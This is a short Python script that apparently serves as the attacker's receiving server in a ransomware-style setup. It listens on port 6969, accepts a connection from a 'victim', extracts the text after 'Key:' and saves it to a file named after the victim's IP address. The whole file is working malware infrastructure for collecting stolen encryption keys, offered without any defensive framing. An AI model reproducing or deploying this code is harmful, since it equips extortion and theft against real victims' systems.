import socket

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
    s.bind(('0.0.0.0', 6969)) # use bind method
    s.listen() # wait for a connection

    print("Listening...")
    conn, addr = s.accept() # accept a connection, store connection and addres objects
    print("Connection received from " + addr[0])

    # receive the victim's data
    data = conn.recv(4096).decode("UTF-8")
    print("Victim: " + data)

    # After getting the data close the connection
    s.close()
    
    with open(addr[0]+".key", "w") as f:
        separator_index = data.index("Key:") + 4
        f.write(data[separator_index:])


if __name__ == "__main__":
    main()
